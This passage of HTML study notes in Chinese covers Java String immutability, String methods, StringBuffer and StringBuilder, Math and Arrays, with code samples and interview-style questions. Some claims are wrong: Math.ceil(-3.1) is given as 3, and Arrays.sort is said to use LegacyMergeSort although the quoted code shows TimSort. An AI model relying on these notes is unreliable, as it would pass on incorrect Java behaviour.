/><p>true、true、true、false</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221111195410636.png" alt="image-20221111195410636" style="zoom:50%;" /><h3 id="String对象特性"><a href="#String对象特性" class="headerlink" title="String对象特性"></a>String对象特性</h3><ol><li><p><strong>String是一个final类，代表不可变的字符序列。</strong></p></li><li><p><strong>字符串时不可变的。一个字符串对象一旦被分配，其内容是不可变的。</strong></p></li></ol><p>例题：以下语句创建了几个对象？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hello&quot;</span>;<br>s1 = <span class="hljs-string">&quot;haha&quot;</span>;<br></code></pre></td></tr></table></figure><p>答：两个。第一条语句直接在常量创建”hello”对象。由于字符串对象不可变，所以第二条语句重新创建了”haha”对象，s1指向”haha”。</p><p><strong>面试题：以下语句创建了几个对象？</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hello&quot;</span>+<span class="hljs-string">&quot;abc&quot;</span>;<br></code></pre></td></tr></table></figure><p>分析：底层会优化，直接等价于 String a &#x3D; “helloabc”;</p><p>所以只创建了一个对象。</p><p>题目2：以下语句创建了几个对象？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hello&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;abc&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> a+b;<br></code></pre></td></tr></table></figure><p>分析：前两条语句创建了两个对象a、b</p><p>第三条语句，内部调用append（）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> StringBuilder <span class="hljs-title function_">append</span><span class="hljs-params">(String str)</span> &#123;<br>    <span class="hljs-built_in">super</span>.append(str);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用了两次append，然后又调用了toString。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// Create a copy, don&#x27;t share the array</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(value, <span class="hljs-number">0</span>, count);<br>&#125;<br></code></pre></td></tr></table></figure><p>也就是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1.</span><span class="hljs-type">StringBuilder</span> <span class="hljs-variable">ss</span> <span class="hljs-operator">=</span> StringBuilder();<br><span class="hljs-number">2.</span>ss.append(<span class="hljs-string">&quot;hello&quot;</span>);<br><span class="hljs-number">3.</span>ss.append(<span class="hljs-string">&quot;abc&quot;</span>);<br><span class="hljs-number">4.</span><span class="hljs-type">String</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> ss.toString();<br>最后c指向堆中的对象(String) value[] -&gt; 池中 <span class="hljs-string">&quot;helloabc&quot;</span><br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221112114153189.png" alt="image-20221112114153189" style="zoom: 25%;" /><p>一共3个对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">d</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;helloabc&quot;</span>;<br>System.out.println(c == d);<br><span class="hljs-comment">//输出？？</span><br></code></pre></td></tr></table></figure><p>输出False。因为c指向堆，d直接指向池中的对象。</p><p>题目3：下面代码输出什么，并说明原因？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hspedu&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">s2</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;java&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">s5</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hspedujava&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">s6</span> <span class="hljs-operator">=</span> (s1 + s2).intern();<br>System.out.println(s5 == s6);<br>System.out.println(s5.equals(s6));<br></code></pre></td></tr></table></figure><p>输出：True、True.</p><p>因为s6和s5都指向常量池的”hspedujava”。</p><p>题目4：</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221112122631995.png" alt="image-20221112122631995" style="zoom:50%;" /><p>输出：hsp and hava。</p><p>str 和 char[] 作为类Test1的属性存于堆中。</p><p>只要调用方法就会在栈中产生新的栈。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221112152600330.png" alt="image-20221112152600330"></p><h3 id="String常用方法"><a href="#String常用方法" class="headerlink" title="String常用方法"></a>String常用方法</h3><p><strong>常用方法：</strong></p><ul><li><p>equals&#x2F;&#x2F;区分大小写，判断内容是否相等</p></li><li><p>equalslgnoreCase&#x2F;&#x2F;忽略大小写，判断内容是否相等</p></li><li><p>length&#x2F;&#x2F;获取字符的个数，字符串的长度</p></li><li><p>indexOf&#x2F;&#x2F;获取字符在字符串中第1次出现的索引，索引从0开始，如果找不到，返回－1</p></li><li><p>lastlndexOf&#x2F;&#x2F;获取字符在字符串中最后1次出现的索引，索引从0开始，如找不到，返回－1</p></li><li><p>substring&#x2F;&#x2F;截取指定范围的子串</p></li><li><p>trim&#x2F;&#x2F;去前后空格</p></li><li><p>charAt:获取某索引处的字符，注意不能使用Str［index］ 这种方式.</p></li><li><p>toUpperCase</p></li><li><p>toLowerCase</p></li><li><p>concat 拼接字符串</p></li><li><p>replace 替换字符串中的字符</p><ul><li>例如：s2 &#x3D; s1.replace(“宝玉”,”jack”);</li><li>s1.replaca()执行后，返回的结果才是替换过的。s1本身无影响。</li></ul></li><li><p>split 分割字符串，对于某些分割字符，我们需要 转义比如｜\ \等</p><ul><li><p>例如： </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">poem</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;锄禾日当午,汗滴禾下土,谁知盘中餐,粒粒皆辛苦&quot;</span>;<br>String[] split = poem.split(<span class="hljs-string">&quot;,&quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; split.length; i++) &#123;<br>    System.out.println(split[i]);<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221112163943852.png" alt="image-20221112163943852" style="zoom:50%;" /><p>又例如：文件名分割</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">poem</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;E:\\aaa\\bbb&quot;</span>;<br>String[] split = poem.split(<span class="hljs-string">&quot;\\\\&quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; split.length; i++) &#123;<br>    System.out.println(split[i]);<br>&#125;<br></code></pre></td></tr></table></figure><p>如果对字符串进行分割时，有特殊字符，需要加入转义符\</p></li></ul></li><li><p>compareTo&#x2F;&#x2F;比较两个字符串的大小</p><ol><li><p>如果长度相同，每个字符也相同，返回0</p></li><li><p>如果长度相同或者不相同，但在进行比较时，可以区分大小</p><p>就返回if(c1!&#x3D;c2){ return c1-c2};</p></li><li><p>如果前面部分都相同，返回str1.len - str2.len</p></li></ol></li><li><p>toCharArray&#x2F;&#x2F;转换成字符数组</p></li><li><p>format&#x2F;&#x2F;格式字符串，％s 字符串 ％c 字符 ％d 整型 ％．2f 浮点型</p><ul><li>%s、%d、%c、%.2f 称为占位符</li><li>占位符由后面变量来替换</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;john&quot;</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br><span class="hljs-type">double</span> <span class="hljs-variable">score</span> <span class="hljs-operator">=</span> <span class="hljs-number">98.3</span>/<span class="hljs-number">3</span>;<br><span class="hljs-type">char</span> <span class="hljs-variable">gender</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;男&#x27;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> String.format(<span class="hljs-string">&quot;我的名字是%s，年龄是%d，成绩是%.2f，性别是%c，希望大家喜欢我。&quot;</span>,name,age,score,gender);<br>System.out.println(<span class="hljs-string">&quot;info=&quot;</span>+info);<br></code></pre></td></tr></table></figure><p>输出：info&#x3D;我的名字是john，年龄是10，成绩是32.77，性别是男，希望大家喜欢我。</p></li></ul><h2 id="3-StringBuffer-amp-StringBuilder类"><a href="#3-StringBuffer-amp-StringBuilder类" class="headerlink" title="3.StringBuffer&amp;StringBuilder类"></a>3.StringBuffer&amp;StringBuilder类</h2><p>String类是保存字符串常量的，每次更新都要重新开辟空间，效率较低。</p><p>因此java设计者还提供了<strong>StringBuilder</strong>和<strong>StringBuffer</strong>来增强String的功能，并提高效率。</p><p>例如下面这段循环。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;i&lt;<span class="hljs-number">80000</span>;i++)&#123;<br>s+=<span class="hljs-string">&quot;hello&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>循环8w次，每一次更改s都要重新开辟空间。非常麻烦，效率极低。</p><h3 id="StringBuffer"><a href="#StringBuffer" class="headerlink" title="StringBuffer"></a>StringBuffer</h3><ul><li>java.lang.StringBuffer代表可变的字符序列，可以对字符串内容进行增删改查。</li><li>很多方法与String相同，但StringBuffer是可变长度的。</li><li>StringBuffer是一个容器。</li></ul><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221112175503010.png" alt="image-20221112175503010" style="zoom:50%;" /><ul><li><p>StringBuffer 的直接父类是AbstractStringBuilder。</p></li><li><p>StringBuffer 实现了 Serializable。即StringBuffer的对象可以串行化。</p></li><li><p>在父类中 AbstractStringBuilder 有属性 char[] value，不是final。</p><p>该value数组存放字符串内容。引出存放在堆中的。</p></li><li><p>StringBuffer是一个final类，不能被继承。</p></li></ul><p><strong>String 和 StringBuffer的比较</strong>：</p><ol><li>String保存的是<strong>字符串常量</strong>，里面的<strong>值不能更改</strong>，每次String类的更新实际 上就是更改地址，效率较低<ul><li>private final char value［］；</li></ul></li><li>StringBuffer保存的是<strong>字符串变量</strong>，里面的<strong>值可以更改</strong>，每次StringBuffer的更新实际上可以更新内容，<strong>不用更新地址，效率较高</strong><ul><li>char［］ value； ／&#x2F; 这个放在堆.</li></ul></li></ol><p><strong>StringBuffer的构造器：</strong></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221112181324051.png" alt="image-20221112181324051"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//1.创建一个大小为16的char[]数组，用于存放字符内容</span><br><span class="hljs-type">StringBuffer</span> <span class="hljs-variable">stringBuffer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br><br><span class="hljs-comment">//2.通过构造器指定char[]大小</span><br><span class="hljs-type">StringBuffer</span> <span class="hljs-variable">stringBuffer1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>(<span class="hljs-number">100</span>);<br><br><span class="hljs-comment">//3.通过 给一个String 创建StringBuffer  (16+str.len)</span><br><span class="hljs-type">StringBuffer</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>(<span class="hljs-string">&quot;hello&quot;</span>);<br></code></pre></td></tr></table></figure><p><strong>String 和 StringBuffer相互转换：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//String -》 StringBuffer</span><br><span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hello tom&quot;</span>;<br><span class="hljs-comment">//方式1</span><br><span class="hljs-comment">//注意：返回的才是StringBuffer对象，对str本身没有影响</span><br><span class="hljs-type">StringBuffer</span> <span class="hljs-variable">b1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>(str);<br><span class="hljs-comment">//方式2</span><br><span class="hljs-type">StringBuffer</span> <span class="hljs-variable">b2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>b2 = b2.append(str);<br><br><span class="hljs-comment">//StringBuffer -》 String</span><br><span class="hljs-type">StringBuffer</span> <span class="hljs-variable">b3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>(<span class="hljs-string">&quot;hspedu&quot;</span>);<br><span class="hljs-comment">//方式1 使用StringBuffer提供的toString方法</span><br><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> b3.toString();<br><span class="hljs-comment">//方式2 使用构造器</span><br><span class="hljs-type">String</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(b3);<br></code></pre></td></tr></table></figure><p><strong>StringBuffer的常用方法</strong></p><p>1） 增 append<br>2） 删 delete（start，end）<br>3） 改 replace（start，end，string）<br>4） 查 indexOf ／／查找子串在字符串第1<br>次出现的索引，如果找不到返回-1<br>5） 插 insert<br>6） 获取长度 length</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">StringBuffer</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>(<span class="hljs-string">&quot;hello&quot;</span>);<br><span class="hljs-comment">//增</span><br>s.append(<span class="hljs-string">&quot;,&quot;</span>);<br>s.append(<span class="hljs-string">&quot;张三丰&quot;</span>);<br>s.append(<span class="hljs-string">&quot;赵敏&quot;</span>).append(<span class="hljs-number">100</span>).append(<span class="hljs-literal">true</span>).append(<span class="hljs-number">10.5</span>);<br>System.out.println(s); <span class="hljs-comment">//hello,张三丰赵敏100true10.5</span><br><span class="hljs-comment">//删</span><br>s.delete(<span class="hljs-number">11</span>,<span class="hljs-number">14</span>);<br>System.out.println(s); <span class="hljs-comment">//hello,张三丰赵敏true10.5</span><br><span class="hljs-comment">//改</span><br>s.replace(<span class="hljs-number">9</span>,<span class="hljs-number">11</span>,<span class="hljs-string">&quot;周芷若&quot;</span>);<br>System.out.println(s); <span class="hljs-comment">//hello,张三丰周芷若true10.5</span><br><span class="hljs-comment">//查找字符串第一次出现索引</span><br><span class="hljs-type">int</span> <span class="hljs-variable">indexOf</span> <span class="hljs-operator">=</span> s.indexOf(<span class="hljs-string">&quot;张三丰&quot;</span>);<br>System.out.println(indexOf); <span class="hljs-comment">//6</span><br><span class="hljs-comment">//插</span><br>s.insert(<span class="hljs-number">9</span>,<span class="hljs-string">&quot;赵敏&quot;</span>);<br>System.out.println(s);<br><span class="hljs-comment">//长度</span><br>System.out.println(s.length()); <span class="hljs-comment">//22</span><br></code></pre></td></tr></table></figure><p>测试1：以下代码的输出是？</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221113005253653.png" alt="image-20221113005253653" style="zoom:50%;" /><p>输出：4、null、(抛出空指针异常)</p><p>测试2：</p><blockquote><p>输入商品名称和商品价格，要求打印效果示例，使用前面学习的方法完成：</p><p>商品名 商品价格<br>手机 123，564.59<br>要求：价格的小数点前面每三位用逗号隔开。</p></blockquote><p>小数点：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">price</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;11111111123564.59&quot;</span>;<br><span class="hljs-type">StringBuffer</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>(price);<br><span class="hljs-comment">//找到小数点的索引</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> sb.lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>)-<span class="hljs-number">3</span>; i&gt;<span class="hljs-number">0</span>; i-=<span class="hljs-number">3</span> ) &#123;<br>    sb.insert(i,<span class="hljs-string">&quot;,&quot;</span>);<br>&#125;<br>System.out.println(sb);<br></code></pre></td></tr></table></figure><p>输出：11,111,111,123,564.59</p><h3 id="StringBuilder"><a href="#StringBuilder" class="headerlink" title="StringBuilder"></a>StringBuilder</h3><ol><li>一个可变的字符序列。此类提供一个与StringBuffer 兼容的 API，但不保证同步。该类被设计用作 StringBuffer的一个简易替换，<strong>用在字符串缓冲区被单个线程使用的时候</strong>。如果可能，建议优先采用该类，因为在大多数实现中，它比 StringBuffer 要快  。</li><li>在StringBuilder 上的主要操作是 append 和 insert 方法，可重载这些方法，以接受任意类型的数据。</li></ol><p>和StringBuffer差不多。</p><p>但StringBuilder的方法，没有做互斥处理。因此在单线程的情况下使用StringBuilder。</p><h3 id="String、StringBuffer和StringBuilder的比较"><a href="#String、StringBuffer和StringBuilder的比较" class="headerlink" title="String、StringBuffer和StringBuilder的比较"></a>String、StringBuffer和StringBuilder的比较</h3><ol><li>StringBuilder 和 StringBuffer 非常类似，均代表可变的字符序列，而且方法也一样</li><li>String:不可变字符序列，效率低，但是复用率高。</li><li>StringBuffer:可变字符序列、效率较高（增删）、线程安全</li><li>StringBuilder:可变字符序列、效率最高、线程不安全</li><li>String使用注意说明：<br>string s＝＂a＂； ／&#x2F;创建了一个字符串<br>s ＋＝ ＂b＂； ／&#x2F;实际上原来的＂a＂字符串对象已经丢弃了，现在又产生了一个字符串s＋＂b＂（也就是＂ab＂）。如果多次执行这些改变串内容的操作，会导致大量副本字符串对象存留在内存中，降低效率。如果这样的操作放到循环中，会极大影响程序的性能。</li></ol><p>结论：如果我们对String 做大量修改，不要使用String</p><ul><li>如果字符串存在大量的修改操作，一般使用 StringBuffer 或StringBuilder</li><li>如果字符串存在大量的修改操作，并在单线程的情况，使用 StringBuilder</li><li>如果字符串存在大量的修改操作，并在多线程的情况，使用 StringBuffer</li><li>如果我们字符串很少修改，被多个对象引用，使用String，比如配置信息等</li></ul><h2 id="4-Math类"><a href="#4-Math类" class="headerlink" title="4.Math类"></a>4.Math类</h2><p>Math类包含用于执行基本数学运算的方法，如初等指数、对数、平方根和三角函数。</p><p><strong>常用方法：</strong></p><p>1） abs 绝对值</p><p>2） pow 求幂</p><p>​例如：Math.pow(2,4); &#x2F;&#x2F;2的四次方</p><p>3） ceil 向上取整</p><p>​例如：Math.ceil(3.1); &#x2F;&#x2F;返回4</p><p>​Math.ceil(-3.1); &#x2F;&#x2F;返回3</p><p>4） floor 向下取整</p><p>5） round 四舍五入</p><p>6） sqrt 求开方</p><p>7） random 求随机数</p><p> ／&#x2F;思考:<br>请写出获取a-b之间的一个随机整数，a，b均为整数？2-7</p><p>​例如：(int)Math.random()<em>6 &#x2F;&#x2F;返回的是 0&lt;&#x3D; x &lt; 6<br>$$<br>(int)(a+Math.random()</em>(b-a+1))<br>$$<br>8）max 求两个数的最大值</p><p>9） min 求两个数的最小值</p><h2 id="5-Arrays类"><a href="#5-Arrays类" class="headerlink" title="5.Arrays类"></a>5.Arrays类</h2><p>Arrays包含一系列静态方法，用于管理或操作数组（比如排序和搜索）</p><p><strong>1） toString 返回数组的字符串形式</strong></p><p>Arrays.toString(arr)</p><p><strong>2） sort 排序（自然排序和定制排序）</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Integer arr[] = &#123;<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">89</span>&#125;;<br><br>Arrays.sort(arr);<br></code></pre></td></tr></table></figure><p>因为数组是引用类型，所以通过sort排序后，会直接影响到实参arr</p><p>sort是重载的，也可以通过传入一个接口Comparator实现定制排序。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//调用 定制排序 时，传入两个参数（1）排序的数组arr</span><br>Arrays.sort(T[],Comparator&lt;? <span class="hljs-built_in">super</span> T&gt; c);<br></code></pre></td></tr></table></figure><p>例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,<span class="hljs-number">8</span>,<span class="hljs-number">0</span>,<span class="hljs-number">20</span>&#125;;<br></code></pre></td></tr></table></figure><p>普通方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//使用冒泡完成排序</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">bubble01</span><span class="hljs-params">(<span class="hljs-type">int</span>[] arr)</span>&#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length - <span class="hljs-number">1</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; arr.length - <span class="hljs-number">1</span>; j++) &#123;<br>            <span class="hljs-comment">//从小到大</span><br>            <span class="hljs-keyword">if</span> (arr[j] &gt; arr[j+<span class="hljs-number">1</span>])&#123;<br>                temp = arr[j];<br>                arr[j] = arr[j + <span class="hljs-number">1</span>];<br>                arr[j + <span class="hljs-number">1</span>] = temp;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>冒泡+定制（Comparator）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//结合冒泡 + 定制</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">bubble02</span><span class="hljs-params">(<span class="hljs-type">int</span>[] arr,Comparator c)</span>&#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length - <span class="hljs-number">1</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; arr.length - <span class="hljs-number">1</span>; j++) &#123;<br>            <span class="hljs-comment">//从小到大</span><br>            <span class="hljs-keyword">if</span> (c.compare(arr[j],arr[j+<span class="hljs-number">1</span>])&gt;<span class="hljs-number">0</span>)&#123;<br>                temp = arr[j];<br>                arr[j] = arr[j + <span class="hljs-number">1</span>];<br>                arr[j + <span class="hljs-number">1</span>] = temp;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Arrays.sort的内部代码:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">sort</span><span class="hljs-params">(T[] a, Comparator&lt;? <span class="hljs-built_in">super</span> T&gt; c)</span> &#123;<br>    <span class="hljs-keyword">if</span> (c == <span class="hljs-literal">null</span>) &#123;<br>        sort(a);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (LegacyMergeSort.userRequested)<br>            legacyMergeSort(a, c);<br>        <span class="hljs-keyword">else</span><br>            TimSort.sort(a, <span class="hljs-number">0</span>, a.length, c, <span class="hljs-literal">null</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用了LegacyMergeSort算法进行排序。</p><p><strong>3）binarySearch 通过二分搜索法进行查找，要求必须排好序</strong></p><p>Arrays.binarySearch(arr, key); </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 